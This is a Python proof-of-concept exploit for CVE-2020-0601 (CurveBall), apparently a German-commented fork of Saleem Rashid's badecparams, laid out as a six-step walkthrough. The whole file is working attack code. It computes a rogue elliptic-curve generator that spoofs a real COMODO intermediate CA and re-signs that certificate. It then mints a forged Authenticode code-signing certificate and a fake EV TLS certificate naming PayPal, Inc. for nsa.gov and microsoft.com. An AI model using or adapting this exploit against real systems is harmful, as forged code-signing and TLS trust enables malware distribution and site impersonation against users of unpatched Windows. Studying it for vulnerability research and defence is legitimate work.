#!/usr/bin/env python3
"""
badecparams.py – CVE-2020-0601 (CurveBall) Proof of Concept
Original: Saleem Rashid (@saleemrash1d) – https://github.com/saleemrashid/badecparams

Dieses Fork teilt den Angriff in sechs explizite Schritte auf,
sodass jede Phase einzeln nachvollzogen werden kann.
"""

import datetime
import hashlib
import os
import subprocess
import sys
from typing import BinaryIO, Iterable, Optional, Sequence, Tuple

import ecdsa.curves
import ecdsa.ellipticcurve
import ecdsa.numbertheory
import ecdsa.util
from asn1crypto import core, keys, pem, x509

OPENSSL = "openssl"
CERTIFICATE_CHAIN = "comodoecccertificationauthority-ev-comodoca-com-chain.pem"

# ─────────────────────────────────────────────────────────────────────────────
# Hilfsfunktionen (unveraendert gegenueber Original)
# ─────────────────────────────────────────────────────────────────────────────

def load_certificate_chain(filename: str) -> Iterable[x509.Certificate]:
    with open(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), filename), "rb"
    ) as f:
        pem_bytes = f.read()
    for object_type, _, der_bytes in pem.unarmor(pem_bytes, multiple=True):
        if object_type != "CERTIFICATE":
            continue
        yield x509.Certificate.load(der_bytes)


def generate_ec_private_key(name: str) -> keys.ECPrivateKey:
    der_bytes = subprocess.check_output(
        (OPENSSL, "ecparam", "-name", name, "-param_enc", "explicit",
         "-genkey", "-noout", "-outform", "DER")
    )
    return keys.ECPrivateKey.load(der_bytes)


def get_exploit_generator(
    k: int, Qx: int, Qy: int, curve: ecdsa.curves.Curve
) -> Tuple[int, int]:
    k_inverse = ecdsa.numbertheory.inverse_mod(k, curve.order)
    Q = ecdsa.ellipticcurve.Point(curve.curve, Qx, Qy, curve.order)
    G = Q * k_inverse
    return (G.x(), G.y())


def curve_from_ec_parameters(parameters: keys.SpecifiedECDomain) -> ecdsa.curves.Curve:
    p = parameters["field_id"]["parameters"].native
    a = parameters["curve"]["a"].cast(core.IntegerOctetString).native
    b = parameters["curve"]["b"].cast(core.IntegerOctetString).native
    Gx, Gy = parameters["base"].to_coords()
    order = parameters["order"].native
    curve_fp = ecdsa.ellipticcurve.CurveFp(p, a, b)
    G = ecdsa.ellipticcurve.Point(curve_fp, Gx, Gy, order)
    return ecdsa.curves.Curve(None, curve_fp, G, (0, 0))


def digest_certificate(certificate: x509.Certificate) -> bytes:
    der_bytes = certificate["tbs_certificate"].dump()
    return hashlib.new(certificate.hash_algo, der_bytes).digest()


def sign_certificate(
    signing_key: ecdsa.keys.SigningKey, certificate: x509.Certificate
) -> None:
    digest = digest_certificate(certificate)
    signature_bytes = signing_key.sign_digest(
        digest, sigencode=ecdsa.util.sigencode_der
    )
    certificate["signature_value"] = signature_bytes


def exploit_certificate(
    certificate: x509.Certificate,
) -> Tuple[ecdsa.keys.SigningKey, keys.ECPrivateKey]:
    curve_name = certificate.public_key["algorithm"]["parameters"].chosen.native
    ec_private_key = generate_ec_private_key(curve_name)
    k = ec_private_key["private_key"].native
    parameters = ec_private_key["parameters"].chosen
    nist_curve = curve_from_ec_parameters(parameters)
    Qx, Qy = certificate.public_key["public_key"].to_coords()
    Gx, Gy = get_exploit_generator(k, Qx, Qy, nist_curve)
    parameters["base"] = keys.ECPoint.from_coords(Gx, Gy)
    ec_private_key["parameters"] = parameters
    ec_private_key["public_key"] = certificate.public_key["public_key"]
    certificate.public_key["algorithm"]["parameters"] = parameters
    exploit_curve = curve_from_ec_parameters(parameters)
    signing_key = ecdsa.keys.SigningKey.from_secret_exponent(k, curve=exploit_curve)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
    certificate["tbs_certificate"]["signature"] = signed_digest_algorithm
    certificate["signature_algorithm"] = signed_digest_algorithm
    sign_certificate(signing_key, certificate)
    return (signing_key, ec_private_key)


def write_pem(f: BinaryIO, value: core.Asn1Value, object_type: str) -> None:
    print("  Schreibe {} -> {!r}".format(object_type, f.name), file=sys.stderr)
    der_bytes = value.dump()
    pem_bytes = pem.armor(object_type, der_bytes)
    f.write(pem_bytes)


def generate_private_key(
    algorithm: str, **kwargs: object,
) -> Tuple[keys.PrivateKeyInfo, keys.PublicKeyInfo]:
    genpkey_args = [OPENSSL, "genpkey", "-algorithm", algorithm, "-outform", "DER"]
    for opt, value in kwargs.items():
        genpkey_args.extend(("-pkeyopt", "{}:{}".format(opt, value)))
    private_key_bytes = subprocess.check_output(genpkey_args)
    private_key = keys.PrivateKeyInfo.load(private_key_bytes)
    public_key_bytes = subprocess.check_output(
        (OPENSSL, "pkey", "-pubout", "-inform", "DER", "-outform", "DER"),
        input=private_key_bytes,
    )
    public_key = keys.PublicKeyInfo.load(public_key_bytes)
    return private_key, public_key


def random_serial_number() -> int:
    return int.from_bytes(os.urandom(20), "big") >> 1


def get_name(purpose: Optional[str] = None) -> str:
    components = ["BADECPARAMS CVE-2020-0601", "(Saleem Rashid @saleemrash1d)"]
    if purpose:
        components.insert(1, purpose)
    return " ".join(components)


def write_authenticode_certificate(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
    name: str,
    subject: x509.Name,
) -> None:
    private_key, public_key = generate_private_key("RSA", rsa_keygen_bits=4096)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert.subject,
                "validity": {
                    "not_before": x509.UTCTime(datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)),
                    "not_after":  x509.UTCTime(datetime.datetime(2021, 1, 1, tzinfo=datetime.timezone.utc)),
                },
                "subject": subject,
                "subject_public_key_info": public_key,
                "extensions": [
                    {"extn_id": "basic_constraints", "critical": True,  "extn_value": {"ca": False}},
                    {"extn_id": "key_usage",          "critical": True,  "extn_value": {"digital_signature"}},
                    {"extn_id": "extended_key_usage", "critical": True,
                     "extn_value": ["code_signing", "1.3.6.1.4.1.311.2.1.21", "1.3.6.1.4.1.311.2.1.22"]},
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
        }
    )
    sign_certificate(signing_key, certificate)
    with open(name + ".crt", "wb") as f:
        write_pem(f, certificate,  "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert,      "CERTIFICATE")
    with open(name + ".key", "wb") as f:
        write_pem(f, private_key, "RSA PRIVATE KEY")
    subprocess.check_call(
        ("openssl", "crl2pkcs7", "-nocrl", "-certfile", name + ".crt",
         "-outform", "DER", "-out", name + ".spc")
    )
    subprocess.check_call(
        ("openssl", "rsa", "-in", name + ".key", "-outform", "PVK",
         "-pvk-none", "-out", name + ".pvk")
    )


def write_tls_certificate(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
    name: str,
    subject: x509.Name,
    subject_alt_names: Sequence[str],
) -> None:
    private_key, public_key = generate_private_key("RSA", rsa_keygen_bits=4096)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert_orig.subject,
                "validity": {
                    "not_before": x509.UTCTime(datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)),
                    "not_after":  x509.UTCTime(datetime.datetime(2021, 1, 1, tzinfo=datetime.timezone.utc)),
                },
                "subject": subject,
                "subject_public_key_info": public_key,
                "extensions": [
                    {"extn_id": "basic_constraints", "critical": True, "extn_value": {"ca": False}},
                    {"extn_id": "subject_alt_name",  "critical": False,
                     "extn_value": [x509.GeneralName({"dns_name": d}) for d in subject_alt_names]},
                    {"extn_id": "certificate_policies", "critical": False,
                     "extn_value": [{"policy_identifier": "1.3.6.1.4.1.6449.1.2.1.5.1"}]},
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
        }
    )
    sign_certificate(signing_key, certificate)
    with open(name + ".crt", "wb") as f:
        write_pem(f, certificate,  "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert,      "CERTIFICATE")
    with open(name + ".key", "wb") as f:
        write_pem(f, private_key,  "RSA PRIVATE KEY")
        write_pem(f, certificate,  "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert,      "CERTIFICATE")


# ─────────────────────────────────────────────────────────────────────────────
# SCHRITT-FUNKTIONEN  (das sind die 6 Schritte des Walkthroughs)
# ─────────────────────────────────────────────────────────────────────────────

def schritt1_zertifikatskette_laden() -> Tuple[x509.Certificate, x509.Certificate]:
    """Schritt 1 – Zertifikatskette laden.

    Liest die PEM-Datei und extrahiert das Zwischenzertifikat der COMODO ECC CA.
    Nur dieses (Index 1) ist auf P-256 – es wird angegriffen.
    Die Wurzel (Index 0, P-384) bleibt unangetastet.
    """
    print("\n" + "═" * 60)
    print("  SCHRITT 1  –  Zertifikatskette laden")
    print("═" * 60)

    certs = list(load_certificate_chain(CERTIFICATE_CHAIN))
    _, ca_cert, _ = certs          # Index 1 = COMODO ECC Extended Validation CA

    subject = ca_cert.subject.human_friendly
    curve   = ca_cert.public_key["algorithm"]["parameters"].chosen.native
    Qx, Qy  = ca_cert.public_key["public_key"].to_coords()

    print(f"  Ziel-CA   : {subject}")
    print(f"  Kurve     : {curve}")
    print(f"  Pub-Key Qx: {hex(Qx)[:18]}…")
    print(f"  Pub-Key Qy: {hex(Qy)[:18]}…")
    print()

    ca_cert_orig = ca_cert.copy()
    return ca_cert, ca_cert_orig


def schritt2_angreifer_schluessel_erzeugen(
    ca_cert: x509.Certificate,
) -> Tuple[int, keys.ECPrivateKey, ecdsa.curves.Curve]:
    """Schritt 2 – Angreifer-k und Standardparameter erzeugen.

    openssl ecparam erzeugt einen frischen EC-Schluessel mit -param_enc explicit,
    sodass alle Kurvenparameter ausgeschrieben (nicht als Named-Curve-OID) vorliegen.
    Das ist die Voraussetzung, damit wir den Basispunkt spaeter ersetzen koennen.
    """
    print("═" * 60)
    print("  SCHRITT 2  –  Angreifer-k und Standardparameter erzeugen")
    print("═" * 60)

    curve_name   = ca_cert.public_key["algorithm"]["parameters"].chosen.native
    ec_private_key = generate_ec_private_key(curve_name)

    k          = ec_private_key["private_key"].native
    parameters = ec_private_key["parameters"].chosen
    nist_curve = curve_from_ec_parameters(parameters)

    std_Gx, std_Gy = parameters["base"].to_coords()

    print(f"  Kurve     : {curve_name}")
    print(f"  k (privat): {hex(k)[:18]}…")
    print(f"  Standard-G: ({hex(std_Gx)[:10]}…, {hex(std_Gy)[:10]}…)")
    print()

    return k, ec_private_key, nist_curve


def schritt3_manipulierten_generator_berechnen(
    k: int,
    ec_private_key: keys.ECPrivateKey,
    nist_curve: ecdsa.curves.Curve,
    ca_cert: x509.Certificate,
) -> Tuple[int, int, keys.SpecifiedECDomain]:
    """Schritt 3 – Manipulierten Generator G' berechnen.

    Formel: G' = k^{-1} * Q   (mod n)

    Damit gilt: k * G' = k * k^{-1} * Q = Q
    Der Angreifer hat keinen Zugriff auf den privaten Schluessel der echten CA,
    besitzt aber trotzdem einen gueltigen Signing-Key zum oeffentlichen Punkt Q.
    """
    print("═" * 60)
    print("  SCHRITT 3  –  Manipulierten Generator G' berechnen")
    print("═" * 60)
    print("  Formel: G' = k⁻¹ · Q   (mod n)")

    parameters = ec_private_key["parameters"].chosen
    Qx, Qy    = ca_cert.public_key["public_key"].to_coords()
    Gx, Gy    = get_exploit_generator(k, Qx, Qy, nist_curve)

    # Sanity-Checks
    Q_point  = ecdsa.ellipticcurve.Point(nist_curve.curve, Qx, Qy, nist_curve.order)
    G_prime  = ecdsa.ellipticcurve.Point(nist_curve.curve, Gx, Gy, nist_curve.order)
    std_Gx, std_Gy = parameters["base"].to_coords()
    G_std    = ecdsa.ellipticcurve.Point(nist_curve.curve, std_Gx, std_Gy, nist_curve.order)

    assert k * G_prime == Q_point,  "FEHLER: k * G' ≠ Q – Berechnung falsch!"
    assert G_prime != G_std,        "FEHLER: G' == G_standard – kein Angriff!"
    assert (Qx, Qy) == ca_cert.public_key["public_key"].to_coords(), \
           "FEHLER: Pub-Key-Bytes stimmen nicht ueberein!"

    print(f"  G'x       : {hex(Gx)[:18]}…")
    print(f"  G'y       : {hex(Gy)[:18]}…")
    print(f"  ✓  k · G' == Q  (Signaturbeziehung verifiziert)")
    print(f"  ✓  G' ≠ G_standard")
    print(f"  ✓  Public-Key-Bytes stimmen mit Ziel-CA ueberein")
    print()

    return Gx, Gy, parameters


def schritt4_zwischenzertifikat_signieren(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    k: int,
    ec_private_key: keys.ECPrivateKey,
    Gx: int,
    Gy: int,
    parameters: keys.SpecifiedECDomain,
) -> Tuple[ecdsa.keys.SigningKey, keys.ECPrivateKey]:
    """Schritt 4 – Zwischenzertifikat neu signieren.

    Der manipulierte Basispunkt G' wird in das Zertifikat eingeschrieben.
    Danach wird das Zertifikat mit k signiert – das ergibt eine kryptographisch
    gueltige Signatur zum oeffentlichen Punkt Q der echten CA.
    """
    print("═" * 60)
    print("  SCHRITT 4  –  Zwischenzertifikat neu signieren")
    print("═" * 60)

    parameters["base"] = keys.ECPoint.from_coords(Gx, Gy)
    ec_private_key["parameters"] = parameters
    ec_private_key["public_key"] = ca_cert.public_key["public_key"]
    ca_cert.public_key["algorithm"]["parameters"] = parameters

    exploit_curve = curve_from_ec_parameters(parameters)
    signing_key   = ecdsa.keys.SigningKey.from_secret_exponent(k, curve=exploit_curve)

    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
    ca_cert["tbs_certificate"]["signature"] = signed_digest_algorithm
    ca_cert["signature_algorithm"]          = signed_digest_algorithm
    sign_certificate(signing_key, ca_cert)

    with open("intermediateCA.crt", "wb") as f:
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert,      "CERTIFICATE")
    with open("intermediateCA.key", "wb") as f:
        write_pem(f, ec_private_key, "EC PRIVATE KEY")

    print("  Ausgabe: intermediateCA.crt  (Original + gefaelschtes Zertifikat)")
    print("  Ausgabe: intermediateCA.key  (Angreifer-Schluessel mit G' als Generator)")
    print()
    return signing_key, ec_private_key


def schritt5_endzertifikate_ausstellen(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
) -> None:
    """Schritt 5 – Endzertifikate ausstellen.

    Zwei Endzertifikate werden mit RSA-4096 erstellt und vom Angreifer-Key signiert:
    - authenticode.*  : Fuer Code-Signing (Microsoft Authenticode)
    - localhost.*     : EV-TLS-Zertifikat fuer nsa.gov, microsoft.com
    """
    print("═" * 60)
    print("  SCHRITT 5  –  Endzertifikate ausstellen")
    print("═" * 60)

    write_authenticode_certificate(
        ca_cert, ca_cert_orig, signing_key,
        "authenticode",
        x509.Name.build({
            "country_name": "GB",
            "common_name":  get_name("Code Signing Authority"),
            "organization_name":      get_name(),
            "organizational_unit_name": get_name("Code Signing Authority"),
        }),
    )
    write_tls_certificate(
        ca_cert, ca_cert_orig, signing_key,
        "localhost",
        x509.Name.build({
            "incorporation_country":    "US",
            "business_category":        "Private Organization",
            "serial_number":            "1",
            "country_name":             "US",
            "common_name":              get_name("EV Certificate"),
            "organization_name":        "PayPal, Inc.",
            "organizational_unit_name": get_name("EV Certificate"),
        }),
        ("localhost", "nsa.gov", "www.nsa.gov", "microsoft.com", "www.microsoft.com"),
    )

    print("  Ausgabe: authenticode.crt / .key / .spc / .pvk")
    print("  Ausgabe: localhost.crt / .key")
    print()


def schritt6_hinweis_auslieferung() -> None:
    """Schritt 6 – Hinweis zur HTTPS-Auslieferung.

    httpd.py startet einen TLS-Server auf Port 443 und liefert das
    gefaelschte Zertifikat ueber das Netz aus.
    """
    print("═" * 60)
    print("  SCHRITT 6  –  Auslieferung ueber HTTPS")
    print("═" * 60)
    print("  Starte den TLS-Server mit:")
    print()
    print("    sudo ./httpd.py localhost.key")
    print()
    print("  Danach in einem zweiten Terminal:")
    print()
    print("    openssl s_client -connect localhost:8443 -showcerts")
    print()
    print("  Der Handshake liefert die vollstaendige gefaelschte Kette.")
    print("  Auf einem ungepatchten Windows-System wuerde Edge/IE")
    print("  das EV-Zertifikat fuer nsa.gov als vertrauenswuerdig anzeigen.")
    print("═" * 60)
    print()


# ─────────────────────────────────────────────────────────────────────────────
# main() – orchestriert alle 6 Schritte
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    print()
    print("  CVE-2020-0601 CurveBall – Proof of Concept (6-Schritt-Walkthrough)")
    print("  Basiert auf: github.com/saleemrashid/badecparams")
    print()

    # Schritt 1: Kette laden
    ca_cert, ca_cert_orig = schritt1_zertifikatskette_laden()

    # Schritt 2: Angreifer-Schluessel erzeugen
    k, ec_private_key, nist_curve = schritt2_angreifer_schluessel_erzeugen(ca_cert)

    # Schritt 3: Manipulierten Generator berechnen
    Gx, Gy, parameters = schritt3_manipulierten_generator_berechnen(
        k, ec_private_key, nist_curve, ca_cert
    )

    # Schritt 4: Zwischenzertifikat neu signieren
    signing_key, ec_private_key = schritt4_zwischenzertifikat_signieren(
        ca_cert, ca_cert_orig, k, ec_private_key, Gx, Gy, parameters
    )

    # Schritt 5: Endzertifikate ausstellen
    schritt5_endzertifikate_ausstellen(ca_cert, ca_cert_orig, signing_key)

    # Schritt 6: Hinweis Auslieferung
    schritt6_hinweis_auslieferung()

    print("  Alle Artefakte wurden im aktuellen Verzeichnis abgelegt.")
    print()


if __name__ == "__main__":
    main()
